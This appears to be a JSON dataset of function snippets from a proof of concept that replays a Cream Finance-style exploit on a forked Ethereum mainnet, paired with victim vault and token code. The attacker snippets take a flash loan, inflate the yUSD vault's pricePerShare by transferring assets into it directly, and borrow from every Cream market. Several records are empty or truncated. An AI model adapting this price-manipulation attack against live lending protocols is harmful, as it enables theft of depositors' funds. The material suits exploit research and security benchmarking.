[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "doIt",
    "original_code": "    function doIt() external {\n        console.log(\"[12. WETH->USDC->DUSD->YUSD]\");\n        WETHToUSDC();\n        USDC.approve(DUSDPOOL, type(uint256).max);\n        IcurveYSwap(DUSDPOOL).exchange_underlying(2, 0, 3_726_501_383_126, 0);\n        DUSD.approve(PeakProxy, type(uint256).max);\n        YVaultPeakProxy(PeakProxy).redeemInYusd(DUSD.balanceOf(address(this)), 0);\n        console.log(\"The yUSD amount in first contract: \", IERC20(yUSD).balanceOf(address(this)) / 1e18);\n\n        console.log(\"------------Inflation------------\");\n        console.log(\"[13. Pump the pricePerShare]\");\n        console.log(\"pricepershare start : \", IYearnVault(yUSD).pricePerShare() / 1e18);\n        IYearnVault(yUSD).withdraw(IERC20(yUSD).balanceOf(address(this)));\n        // withdraw yUSD to yDAI_yUSDC_yUSDT_yTUSD\n        yDAI_yUSDC_yUSDT_yTUSD.transfer(yUSD, IYearnVault(yUSD).totalAssets());\n        console.log(\"pricepershare end : \", IYearnVault(yUSD).pricePerShare() / 1e18);\n\n        console.log(\"------------HeistAndRepay------------\");\n        console.log(\"[14. borrow token from Cream.Finance]\");\n        borrowAll();\n        address(WETH).call{value: 523_208 ether}(\"\");\n        WETH.transfer(secondContract, 524_574 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        // console.log(\"The DAI amount in contract: \", DAI.balanceOf(address(this))  / 1e18);\n\n        console.log(\"[3. deposit DAI to YearnVault get yDAI]\");\n        DAI.approve(curveDepositor, type(uint256).max);\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 13_499_797);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        SecondContract exploitContract = new SecondContract();\n        secondContract = address(exploitContract);\n        console.log(\"[1. Beigin]\");\n        console.log(\"------------Acquire Capital------------\");\n        console.log(\"[2. MakerDao FlashLoan 500_000_000 DAI]\");\n        DaiFlash.flashLoan(address(this), address(DAI), 500_000_000 * 1e18, \"\");\n\n        console.log(\"[17. End]\");\n        console.log(\"------------Proift------------\");\n        console.log(\"Attacker WETH balance after exploit: \", WETH.balanceOf(address(this)) / 1e18);\n        console.log(\"Attacker crDAI balance after exploit: \", withdrawUnderlying(crDAI) / 1e18);\n        console.log(\"Attacker crUSDT balance after exploit: \", withdrawUnderlying(crUSDT) / 1e6);\n        console.log(\"Attacker crUSDC balance after exploit: \", withdrawUnderlying(crUSDC) / 1e6);\n        console.log(\"Attacker crETH balance after exploit: \", withdrawUnderlying(crCRETH2) / 1e18);\n        console.log(\"Attacker crCRETH2 balance after exploit: \", withdrawUnderlying(crDAI) / 1e18);\n        console.log(\"Attacker crFEI balance after exploit: \", withdrawUnderlying(crFEI) / 1e18);\n        console.log(\"Attacker crFTT balance after exploit: \", withdrawUnderlying(crFTT) / 1e18);\n        console.log(\"Attacker crPERP balance after exploit: \", withdrawUnderlying(crPERP) / 1e18);\n        console.log(\"Attacker crRUNE balance after exploit: \", withdrawUnderlying(crRUNE) / 1e18);\n        console.log(\"Attacker crDPI balance after exploit: \", withdrawUnderlying(crDPI) / 1e18);\n        console.log(\"Attacker crUNI balance after exploit: \", withdrawUnderlying(crUNI) / 1e18);\n        console.log(\"Attacker crGNO balance after exploit: \", withdrawUnderlying(crGNO) / 1e18);\n        console.log(\"Attacker crXSUSHI balance after exploit: \", withdrawUnderlying(crXSUSHI) / 1e18);\n        console.log(\"Attacker crSTETH balance after exploit: \", withdrawUnderlying(crSTETH) / 1e18);\n        console.log(\"Attacker crYGG balance after exploit: \", withdrawUnderlying(crYGG) / 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "withdrawUnderlying",
    "original_code": "    function withdrawUnderlying(\n        address token\n    ) public returns (uint256 amount) {\n        address underlying = ICrToken(token).underlying();\n        amount = IERC20(underlying).balanceOf(address(this));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICether",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        borrowAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICether",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(uint mintAmount) external returns (uint) {\n        mintAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICether",
    "source_type": "victim_contract",
    "function_name": "underlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurveDepositor",
    "source_type": "victim_contract",
    "function_name": "add_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurveDepositor",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_imbalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurveDepositor",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_one_coin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IComptroller",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IYearnVault",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "  function deposit(uint256 _amount)\n      external\n      nonReentrant\n  {\n      require(_amount > 0, \"deposit must be greater than 0\");\n      pool = _calcPoolValueInToken();\n\n      IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n\n      // Calculate pool shares\n      uint256 shares = 0;\n      if (pool == 0) {\n        shares = _amount;\n        pool = _amount;\n      } else {\n        shares = (_amount.mul(_totalSupply)).div(pool);\n      }\n      pool = _calcPoolValueInToken();\n      _mint(msg.sender, shares);\n  }\n\n  // No rebalance implementation for lower fees and faster swaps\n",
    "description": ""
  },
  {
    "contract/interface": "IYearnVault",
    "source_type": "victim_contract",
    "function_name": "pricePerShare",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IYearnVault",
    "source_type": "victim_contract",
    "function_name": "totalAssets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IYearnVault",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "  function withdraw(uint256 _shares)\n      external\n      nonReentrant\n  {\n      require(_shares > 0, \"withdraw must be greater than 0\");\n\n      uint256 ibalance = balanceOf(msg.sender);\n      require(_shares <= ibalance, \"insufficient balance\");\n\n      // Could have over value from cTokens\n      pool = _calcPoolValueInToken();\n      // Calc to redeem before updating balances\n      uint256 r = (pool.mul(_shares)).div(_totalSupply);\n\n\n      _balances[msg.sender] = _balances[msg.sender].sub(_shares, \"redeem amount exceeds balance\");\n      _totalSupply = _totalSupply.sub(_shares);\n\n      emit Transfer(msg.sender, address(0), _shares);\n\n      // Check balance\n      uint256 b = IERC20(token).balanceOf(address(this));\n      if (b < r) {\n        _withdrawSome(r.sub(b));\n      }\n\n      IERC20(token).transfer(msg.sender, r);\n      pool = _calcPoolValueInToken();\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) external view returns (uint) {\n        owner; spender; // Shh\n        delegateToViewAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external returns (bool) {\n        spender; amount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) external view returns (uint) {\n        owner; // Shh\n        delegateToViewAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract ReentrancyGuard {\n    uint256 private _guardCounter;\n\n    constructor () internal {\n        _guardCounter = 1;\n    }\n\n    modifier nonReentrant() {\n        _guardCounter += 1;\n        uint256 localCounter = _guardCounter;\n        _;\n        require(localCounter == _guardCounter, \"ReentrancyGuard: reentrant call\");\n    }\n}\n\nlibrary SafeMath {\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint amount) external returns (bool) {\n        dst; amount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YDAI",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {\n        src; dst; amount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "YVaultPeakProxy",
    "source_type": "victim_contract",
    "function_name": "redeemInYusd",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SecondContract",
    "source_type": "victim_contract",
    "function_name": "executeOperation",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SecondContract",
    "source_type": "victim_contract",
    "function_name": "justDoIt",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICrToken",
    "source_type": "victim_contract",
    "function_name": "getCash",
    "original_code": "    function getCash() external view returns (uint) {\n        delegateToViewAndReturn();\n    }\n\n",
    "description": ""
  }
]